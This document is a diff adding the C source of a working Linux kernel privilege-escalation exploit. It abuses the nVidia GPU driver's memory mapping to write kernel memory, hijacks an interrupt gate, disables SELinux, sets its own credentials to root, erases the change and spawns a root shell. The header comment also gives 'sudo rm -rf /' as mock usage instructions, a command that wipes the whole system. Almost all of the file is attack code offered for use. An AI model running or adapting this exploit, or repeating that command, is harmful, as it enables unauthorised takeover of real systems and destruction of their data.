@@ -1,0 +1,760 @@
+/* Anonymous
+ *
+ * How to use: sudo rm -rf /
+ *
+ * greetz: djrbliss, kad, Ac1dB1tch3z, nVidia!
+ *
+ * Only complete fix patch nvidia drivers and redefine
+ * IS_BLACKLISTED_REG_OFFSET:
+
+#define IS_BLACKLISTED_REG_OFFSET(nv, offset, length) 1
+
+ */
+
+#define _GNU_SOURCE
+#include <fcntl.h>
+#include <sys/sysinfo.h>
+#include <stdint.h>
+#include <inttypes.h>
+#include <stdarg.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/wait.h>
+#include <sys/socket.h>
+#include <linux/netlink.h>
+#include <linux/inet_diag.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <errno.h>
+#include <netinet/in.h>
+#include <dirent.h>
+
+#ifdef __x86_64__
+#define KERNEL_BASE 0xffffffff80000000L
+#else
+#define KERNEL_BASE 0xc0000000
+#endif
+
+#define ENTRY 0xdc
+
+#define inline __attribute__((always_inline))
+#ifdef __x86_64__
+#define __kernel
+#else
+#define __kernel __attribute__((regparm(3)))
+#endif
+#define __used __attribute((used))
+
+static unsigned long kernel_ofs_phys;
+static volatile uint32_t *cve_2012_YYYY;
+
+static void poke_byte(volatile uint32_t *m, uint32_t ofs, uint8_t val)
+{
+  uint32_t i = (ofs & 3) * 8;
+  ofs >>= 2;
+  m[ofs] = (m[ofs] & ~(0xff << i)) | (val << i);
+}
+
+static void physread16(volatile uint32_t *m, uint32_t target, uint32_t *buffer)
+{
+  if (1) {
+    uint32_t ofs = (target & 0x3ffff)/4, i;
+
+    if (target & 0xf) {
+      printf("[ ] Function requires 16-byte alignment for input!\n");
+      exit(-1);
+    }
+
+    cve_2012_YYYY[0xf00/4] = 0xb | ((target >> 18) << 10);
+    memset(buffer, 0, 16);
+    for (i = 0; i < 4; ++i) {
+      uint32_t shift = i * 8;
+      poke_byte(cve_2012_YYYY, 0x204, i);
+      buffer[0] |= (m[ofs/4] & 0xff) << shift;
+      buffer[1] |= ((m[ofs/4] & 0xff00) >> 8) << shift;
+      buffer[2] |= ((m[ofs/4] & 0xff0000) >> 16) << shift;
+      buffer[3] |= ((m[ofs/4] & 0xff000000) >> 24) << shift;
+    }
+  }
+}
+
+static void physwrite16(volatile uint32_t *m, uint32_t target, uint32_t *buffer)
+{
+  if (1) {
+    uint32_t i, ofs = (target & 0x3ffff)/4;
+    if (target & 0xf) {
+      printf("[ ] Function requires 16-byte alignment for output!\n");
+      exit(-1);
+    }
+
+    cve_2012_YYYY[0xf00/4] = 0xb | ((target >> 18) << 10);
+
+    for (i = 0; i < 4; ++i) {
+      int shift = 8 * i;
+      uint32_t val;
+      poke_byte(cve_2012_YYYY, 0x102, 1<<i);
+      val = (buffer[0] >> shift) & 0xff;
+      val |= ((buffer[1] >> shift) & 0xff) << 8;
+      val |= ((buffer[2] >> shift) & 0xff) << 16;
+      val |= ((buffer[3] >> shift) & 0xff) << 24;
+      m[ofs/4] = val;
+    }
+  }
+}
+
+unsigned long virt2phys(unsigned long addr)
+{
+  unsigned long phys;
+  addr &= ~KERNEL_BASE;
+  addr += kernel_ofs_phys;
+  phys = addr & 0xffffffff;
+  return phys;
+}
+
+// dest has to be 16-byte and slightly larger for unaligned reads
+void *kernel_read(volatile uint32_t *m, void *dest, unsigned long src, unsigned long len)
+{
+  uint32_t rem, phys = virt2phys(src);
+  void *ret = dest + (src & 0xf);
+
+  rem = (-phys) & 0xf;
+  if (rem) {
+    physread16(m, phys & ~0xf, dest);
+    dest += 0x10;
+    phys += rem;
+    if (len > rem)
+      len -= rem;
+    else
+      len = 0;
+  }
+
+  for (; len; phys += 0x10, dest += 0x10, len -= len >= 16 ? 16 : len)
+    physread16(m, phys, dest);
+
+  return ret;
+}
+
+void kernel_write(volatile uint32_t *m, unsigned long dest, unsigned long src, unsigned long len)
+{
+  uint32_t phys;
+  unsigned long remaining, towrite, i;
+
+  phys = virt2phys(dest);
+
+  if (!m || m == MAP_FAILED)
+    puts("not actually writing...");
+
+  if (1) {
+    remaining = len;
+    for (i = 0; i < len; i += 16) {
+      uint32_t buffer[4];
+      if (remaining < 16)
+        physread16(m, phys + i, (uint32_t*)buffer);
+      towrite = remaining > 16 ? 16 : remaining;
+      memcpy(buffer, (void*)(src + i), towrite);
+      physwrite16(m, phys + i, (uint32_t*)buffer);
+      remaining -= 16;
+    }
+  }
+}
+
+static void mode_x(volatile uint32_t *x) {
+  // http://wiki.osdev.org/VGA_Hardware Mode X
+
+  // 3c0
+  x[0x310/4] = 0x000f0041;
+  x[0x314/4] = 0;
+
+  // 3c2
+  x[0x000/4] = 0xe3;
+
+  // 3c4
+  x[0x100/4] = 0x000f0103;
+  x[0x104/4] = 0x06;
+
+  // 3ce
+  x[0x204/4] = 0x0f054000;
+
+  // 3d4
+  x[0x400/4] = 0x82504f5f;
+  x[0x404/4] = 0x3e0d8054;
+  poke_byte(x, 0x408, 0);
+  poke_byte(x, 0x409, 0x41);
+  x[0x410/4] = 0x28dfacea;
+  x[0x414/4] = 0xe306e700;
+}
+
+static int dirfilter(const struct dirent *d) {
+  return d->d_type == DT_LNK && strchr(d->d_name, ':');
+}
+
+static int nvidia_fd(uint64_t *res) {
+
+  struct dirent **list;
+  int fd, resfd, ret;
+  char buf[256];
+  ret = scandir("/sys/bus/pci/drivers/nvidia", &list, dirfilter, versionsort);
+  if (ret <= 0)
+    goto fail;
+  sprintf(buf, "/sys/bus/pci/drivers/nvidia/%s/resource", list[0]->d_name);
+  resfd = open(buf, O_RDONLY);
+  if (resfd < 0)
+    goto fail;
+  read(resfd, buf, sizeof(buf));
+  *res = strtoll(buf, NULL, 16);
+  close(resfd);
+
+  if ((fd = open("/dev/nvidia0", O_RDWR)) < 0)
+    goto fail;
+  return fd;
+
+fail:
+  perror("COULD NOT DO SUPER SECRET HACKING STUFF, YOU ARE ON YOUR OWN!");
+  *res = 0;
+  return -1;
+}
+
+volatile uint32_t *nvidia_handle(int fd, uint64_t res) {
+  // access 4 bytes at a time or things go weird
+  volatile uint32_t *m;
+
+  if (fd < 0)
+    return MAP_FAILED;
+
+  // I HAD TO LEARN VGA FOR THIS
+  m = cve_2012_YYYY = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, res + 0x619000);
+  if (m != MAP_FAILED) {
+    if ((m[0xf00/4] & 8) &&
+        (m = mmap(NULL, 0x10000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, res + 0xa0000)) != MAP_FAILED) {
+      printf("[*] CVE-2012-YYYY\n");
+
+      mode_x(cve_2012_YYYY); // put into vga mode x, ish
+      
+      return m;
+    }
+    munmap((void*)cve_2012_YYYY, 0x1000);
+    m = cve_2012_YYYY = MAP_FAILED;
+  }
+  return m;
+}
+
+static int tasknamelen;
+static char taskname[64];
+
+extern long gettask(void);
+extern long testgetroot(void);
+
+__used __kernel extern long callsetroot(long uid, long gid);
+
+#define FN(x) ".globl " x "\n\t.type " x ",@function\n\t" x ":\n\t.cfi_startproc\n\t"
+#define END ".cfi_endproc\n\t"
+asm(
+".text\n\t.align 4\n\t"
+FN("testgetroot")
+  // AND HAVE FUN! :D
+#ifdef __x86_64__
+  "swapgs\n\t"
+  "call getroot\n\t"
+  "swapgs\n\t"
+  "iretq\n\t"
+#else
+  "mov %fs, %edi\n\t"
+  "mov $0xd8, %esi\n\t"
+  "mov %esi, %fs\n\t"
+  "call getroot\n\t"
+  "mov %edi, %fs\n\t"
+  "iretl\n\t"
+#endif
+END
+
+FN("gettask")
+#ifdef __x86_64__
+  // Grab some offsets from system_call
+  "mov $0xc0000082, %ecx\n\t"
+  "rdmsr\n\t"
+  "movslq %eax, %rax\n\t"
+
+  // Fuck optional alignment, fix it by looking for
+  // the start prefix of our lovely mov %gs:.. in system_call we just found
+  // this will get us kernel_stack, in which most cases it means that
+  // our current_task is right below it
+  // This is only needed if kallsyms fails
+  "1:\n\t"
+  "cmpw $0x4865, 0x3(%rax)\n\t"
+  "je 2f\n\t"
+  "incq %rax\n\t"
+  "jmp 1b\n\t"
+  "2:\n\t"
+
+  "movl 17(%rax), %edx\n\t"
+
+  // blegh padding
+  "3:\n\t"
+  "addl $8, %edx\n\t"
+  "movq %gs:(%edx), %rax\n\t"
+  "test %eax, %eax\n\t"
+  "jz 3b\n\t"
+  "cmpl $-1, %eax\n\t"
+  "je 3b\n\t"
+#else
+  // TODO: maybe..
+  "xor %eax, %eax\n\t"
+#endif
+  "ret\n\t"
+END
+
+#define S2(x) #x
+#define S1(x) S2(x)
+
+FN("callsetroot")
+#ifdef __x86_64__
+  "int $" S1(ENTRY) "\n\t"
+#else
+  "push %edi\n\t"
+  "push %esi\n\t"
+  "int $" S1(ENTRY) "\n\t"
+  "pop %esi\n\t"
+  "pop %edi\n\t"
+#endif
+  "ret\n\t"
+END
+
+".previous");
+
+struct kallsyms {
+  unsigned long *addresses;
+  unsigned long num_syms;
+  unsigned char *names;
+  unsigned long *markers;
+
+  unsigned char *token_table;
+  unsigned short *token_index;
+};
+
+// Memory layout kallsyms, all pointer aligned:
+// unsigned long addresses[num_kallsyms]
+// unsigned long num_kallsyms
+// unsigned char names[..]
+// unsigned long markers[(num_kallsyms + 0xff) >> 8] = { 0, ... }
+// char token_table[var...] = { null terminated strings }
+// unsigned short token_index[var?...] = { 0, ... };
+
+// This should probably work for 64-bits and 32-bits kernels
+// But only tested on 64-bits kernels
+inline static long init_kallsyms(struct kallsyms *ks)
+{
+  unsigned long start = KERNEL_BASE + 0x1000000L;
+  unsigned long *max = (void*)KERNEL_BASE + 0x2000000L;
+  unsigned long *cur;
+  for (cur = (void*)start; cur < max; cur += 2) {
+    if (*cur == start &&
+        (cur[1] == start || cur[-1] == start))
+      goto unwind;
+  }
+  return -1;
+
+unwind:
+  while ((cur[0] & KERNEL_BASE) == KERNEL_BASE)
+    cur++;
+  ks->addresses = cur - *cur;
+  ks->num_syms = *(cur++);
+  ks->names = (unsigned char*)cur;
+  do { cur++; } while (*cur);
+  ks->markers = cur;
+  cur += (ks->num_syms + 0xff) >> 8;
+  ks->token_table = (unsigned char*)cur;
+  // Zero terminated string can create padding that could
+  // be interpreted as token_index, requiring the || !*cur
+  do { cur++; } while (*(unsigned short*)cur || !*cur);
+  ks->token_index = (unsigned short*)cur;
+  return (long)ks->num_syms;
+}
+
+#define KSYM_NAME_LEN 128
+inline static int kstrcmp(const char *x, const char *y)
+{
+  for (;*x == *y; x++, y++)
+    if (!*x)
+      return 0;
+  return -1;
+}
+
+/*
+ * kallsyms.c: in-kernel printing of symbolic oopses and stack traces.
+ *
+ * Rewritten and vastly simplified by Rusty Russell for in-kernel
+ * module loader:
+ *   Copyright 2002 Rusty Russell <rusty@rustcorp.com.au> IBM Corporation
+ *
+ * ChangeLog:
+ *
+ * (25/Aug/2004) Paulo Marques <pmarques@grupopie.com>
+ *      Changed the compression method from stem compression to "table lookup"
+ *      compression (see scripts/kallsyms.c for a more complete description)
+ */
+
+inline static unsigned int kallsyms_expand_symbol(struct kallsyms *ks, unsigned int off, char *result)
+{
+  int len, skipped_first = 0;
+  const unsigned char *tptr, *data;
+
+  /* Get the compressed symbol length from the first symbol byte. */
+  data = &ks->names[off];
+  len = *data;
+  data++;
+
+  /*
+   * Update the offset to return the offset for the next symbol on
+   * the compressed stream.
+   */
+  off += len + 1;
+
+  /*
+   * For every byte on the compressed symbol data, copy the table
+   * entry for that byte.
+   */
+  while (len) {
+    tptr = &ks->token_table[ks->token_index[*data]];
+    data++;
+    len--;
+
+    while (*tptr) {
+      if (skipped_first) {
+        *result = *tptr;
+        result++;
+      } else
+        skipped_first = 1;
+      tptr++;
+    }
+  }
+
+  *result = '\0';
+
+  /* Return to offset to the next symbol. */
+  return off;
+}
+
+inline static unsigned long kdlsym(struct kallsyms *ks, char *name)
+{
+  char namebuf[KSYM_NAME_LEN];
+  unsigned long i;
+  unsigned int off;
+
+  for (i = 0, off = 0; i < ks->num_syms; i++) {
+    off = kallsyms_expand_symbol(ks, off, namebuf);
+    if (kstrcmp(namebuf, name) == 0)
+      return ks->addresses[i];
+  }
+  return 0;
+}
+
+__used __kernel long getroot(long uid, long gid)
+{
+  int i;
+  unsigned long cred;
+  int *j = NULL;
+  int k;
+  char *p;
+  struct kallsyms ks;
+  unsigned long task_struct = 0;
+
+  long ret = init_kallsyms(&ks);
+
+  if (ret > 0) {
+    void (*fn)(void);
+    __kernel void *(*fn1)(void*);
+    unsigned long task_offset;
+    char fnops[] = "reset_security_ops";
+    char fntask[] = "current_task";
+    char fncred[] = "get_task_cred";
+
+    // SELINUX is overrated..
+    fn = (void*)kdlsym(&ks, fnops);
+    if (fn) fn();
+
+    // Get a more reliable offset to current_task if we can
+    task_offset = kdlsym(&ks, fntask);
+    if (task_offset)
+#ifdef __x86_64__
+      asm("mov %%gs:(%1), %0" : "=r"(task_struct) : "r"(task_offset));
+#else
+      asm("mov %%fs:(%1), %0" : "=r"(task_struct) : "r"(task_offset));
+#endif
+    else
+      task_struct = gettask();
+    if (!task_struct)
+      return -4;
+
+    fn1 = (void*)kdlsym(&ks, fncred);
+    if (fn1) {
+      j = fn1((void*)task_struct);
+      // And decrease refcount we just increased
+      asm("lock; decl (%0)" :: "r"(j));
+    }
+  }
+  else if (!ret)
+    task_struct = gettask();
+  else
+    return -ret;
+  if (!task_struct)
+    return -5;
+
+  // No kallsyms or no get_task_cred, manually try to find
+  if (!j) {
+    // all the creds are belong to us
+    for (i = 0; i < 0x1000; i += sizeof(void*)) {
+      p = (char *)(task_struct + i);
+      for (k = 0; k < tasknamelen; k++) {
+        if (p[k] != taskname[k])
+          break;
+      }
+      if (k == tasknamelen) {
+        cred = *(unsigned long *)((unsigned long)p - sizeof(unsigned long) * 2);
+        j = (int *)cred;
+        break;
+      }
+    }
+    if (!j)
+      return -1;
+  }
+
+  for (i = 0; i < 1000; i++, j++) {
+    if (j[0] == uid && j[1] == uid && j[2] == uid && j[3] == uid &&
+        j[4] == gid && j[5] == gid && j[6] == gid && j[7] == gid) {
+
+      /* uid, euid, suid, fsuid */
+      j[0] = j[1] = j[2] = j[3] = 0;
+
+      /* gid, egid, sgid, fsgid */
+      j[4] = j[5] = j[6] = j[7] = 0;
+
+      /* ALLCAPS!!111 */
+      j[10] = j[11] = 0xffffffff;
+      j[12] = j[13] = 0xffffffff;
+      j[14] = j[15] = 0xffffffff;
+
+      return 0;
+    }
+  }
+  return -2;
+}
+
+struct gdt
+{
+  uint16_t limit;
+  uint32_t base;
+}__attribute__((packed));
+
+static unsigned long getidt()
+{
+  struct gdt idt;
+  memset(&idt, 0x00, sizeof(struct gdt));
+  asm volatile("sidt %0" : "=m"(idt));
+  return idt.base | 0xFFFFFFFF00000000UL;
+}
+
+typedef struct gate_struct {
+        uint16_t offset_low;
+        uint16_t segment;
+        unsigned ist : 3, zero0 : 5, type : 5, dpl : 2, p : 1;
+        uint16_t offset_middle;
+#ifdef __x86_64__
+        uint32_t offset_high;
+        uint32_t zero1;
+#endif
+} __attribute__((packed)) gate_desc;
+
+enum {
+  GATE_INTERRUPT = 0xE,
+  GATE_TRAP = 0xF,
+  GATE_CALL = 0xC,
+  GATE_TASK = 0x5,
+};
+
+#define YES_PLEASE 3
+#define PTR_LOW(x) ((unsigned long)(x) & 0xFFFF)
+#define PTR_MIDDLE(x) (((unsigned long)(x) >> 16) & 0xFFFF)
+#define PTR_HIGH(x) ((unsigned long)(x) >> 32)
+
+#ifdef __x86_64__
+#define __KERNEL_CS 0x10
+#else
+#define __KERNEL_CS 0x60
+#endif
+
+void dump_gate(gate_desc *gate)
+{
+#if 0
+  uint16_t *p = (void *)gate;
+  unsigned i;
+  for (i = 0; i < sizeof(*gate) / sizeof(uint16_t); i++)
+    printf("%04x\n", *p++);
+#endif
+}
+
+void dump_bytes(void *desc)
+{
+  int i;
+  for (i = 0; i < 16; ++i) {
+    printf("%02x", ((char*)desc)[i]);
+    if (i < 15 && (i % 4) == 3)
+      printf(" ");
+  }
+  printf("\n");
+}
+
+static inline void pack_gate(gate_desc *gate, unsigned type, unsigned long func,
+                             unsigned dpl, unsigned ist, unsigned seg)
+{
+  gate->offset_low = PTR_LOW(func);
+  gate->offset_middle = PTR_MIDDLE(func);
+  gate->segment = seg;
+  gate->ist = ist;
+  gate->p = 1;
+  gate->dpl = dpl;
+  gate->zero0 = 0;
+  gate->type = type;
+#ifdef __x86_64__
+  gate->offset_high = PTR_HIGH(func);
+  gate->zero1 = 0;
+#endif
+  dump_gate(gate);
+}
+
+// Test mode, not really an exploit, although it does
+// show the option to forbid physical memory is useless
+static int devmem_fd(void)
+{
+  int fd = open("/dev/mem", O_RDWR|O_SYNC);
+  if (fd < 0)
+    perror("/dev/mem");
+  return fd;
+}
+
+void *xalloc(unsigned long len)
+{
+  void *ret = NULL;
+  posix_memalign(&ret, 16, ((len+0xf)&~0xf) + 16);
+  return ret;
+}
+
+void xfree(void *ptr)
+{
+  free((void*)((unsigned long)ptr & ~0xfL));
+}
+
+int main(int argc, char * argv[])
+{
+  volatile uint32_t *handle = NULL;
+  long ret, i, found = 0;
+  char *p;
+  gate_desc gate, gate2[16/sizeof(gate_desc)];
+  uint32_t buf[4];
+  gate_desc *dp = (gate_desc*)buf;
+  uint8_t data[256];
+  uint64_t res = 0;
+
+  printf("[*] IDT offset at %#lx\n", getidt());
+
+  // syntax: --dumpmem BAR0, for debugging "cant find my kernel" issues as root
+  if (argc > 2 && (!strcmp(argv[1], "-d") || !strcmp(argv[1], "--dumpmem"))) {
+    res = strtoll(argv[2], NULL, 16);
+    handle = nvidia_handle(devmem_fd(), res);
+
+    for (i = 0; i < 0x4000000; i += 16) {
+      physread16(handle, i, (void*)data);
+      write(2, data, 16);
+    }
+    return 0;
+  } else if (argc > 1 && (res = strtoll(argv[1], NULL, 16))) {
+    handle = nvidia_handle(devmem_fd(), res);
+    if (!getuid()) {
+      setgid(1000);
+      setuid(1000);
+    }
+    if (handle == MAP_FAILED)
+      return -1;
+    printf("[*] Dry run with /dev/mem as uid %u gid %u...\n", getuid(), getgid());
+  }
+
+  if ((p = strchr(argv[0], '/')))
+    p++;
+  else
+    p = argv[0];
+  strcpy(taskname, p);
+  tasknamelen = strlen(taskname);
+
+  if (!handle || handle == MAP_FAILED) {
+    uint64_t res;
+    int fd = nvidia_fd(&res);
+    printf("[*] Abusing nVidia...\n");
+    handle = nvidia_handle(fd, res);
+    if (!handle || handle == MAP_FAILED)
+      return -1;
+  }
+
+  // X86_OF_ENTRY
+  unsigned long idtentry = getidt() + (2*sizeof(unsigned long)*4);
+  pack_gate(&gate, GATE_INTERRUPT, KERNEL_BASE, YES_PLEASE, 0, __KERNEL_CS);
+
+  for (i = 0; i < 256; ++i) {
+    kernel_ofs_phys = i * 1024 * 1024;
+    physread16(handle, virt2phys(idtentry), buf);
+
+    // Copy offsets since we don't really care about them
+    gate.offset_low = dp->offset_low;
+    gate.offset_middle = dp->offset_middle;
+
+#ifndef __x86_64__
+    gate.segment = dp->segment;
+    if (*(uint64_t*)&dp[1] == 0x00000000ffffffffULL) {
+      printf("[X] 64-bits kernel found at ofs %lx\n", kernel_ofs_phys);
+      printf("[X] Compiled for 32-bits only\n");
+      continue;
+    }
+#endif
+
+    if (!memcmp(&gate, dp, sizeof(*dp))) {
+      printf("[*] %zu-bits Kernel found at ofs %lx\n", sizeof(void*)*8, kernel_ofs_phys);
+      found = 1;
+      break;
+    }
+  }
+  if (!found) {
+    printf("[X] No kernel found! >:(\n");
+    return -1;
+  }
+
+  idtentry = getidt() + (2*sizeof(unsigned long)*ENTRY);
+  printf("[*] Using IDT entry: %d (%#lx)\n", ENTRY, idtentry);
+  physread16(handle, virt2phys(idtentry), buf);
+  dump_gate(dp);
+
+  printf("[*] Enhancing gate entry...\n");
+  pack_gate(&gate, GATE_INTERRUPT, (uintptr_t)&(testgetroot), YES_PLEASE, 0, __KERNEL_CS);
+  kernel_write(handle, idtentry, (unsigned long)&gate, sizeof(gate));
+  physread16(handle, virt2phys(idtentry), (uint32_t*)gate2);
+  if (memcmp(&gate, gate2, sizeof(gate))) {
+    printf("[ ] Failed!\n");
+    return -1;
+  }
+
+  printf("[*] Triggering payload...\n");
+  ret = callsetroot(getuid(), getgid());
+  // And restore old one, I'm kind like that
+  printf("[*] Hiding evidence...\n");
+  kernel_write(handle, idtentry, (unsigned long)dp, sizeof(*dp));
+  if (ret)
+    printf("callsetroot returned %lx (%li)\n", ret, ret);
+
+  if (getuid()) {
+    printf("[*] Failed to get root.\n");
+    return -1;
+  }
+
+  printf("[*] Have root, will travel..\n");
+  execl("/bin/bash", "sh", NULL);
+  perror("/bin/bash");
+  return 1;
+}
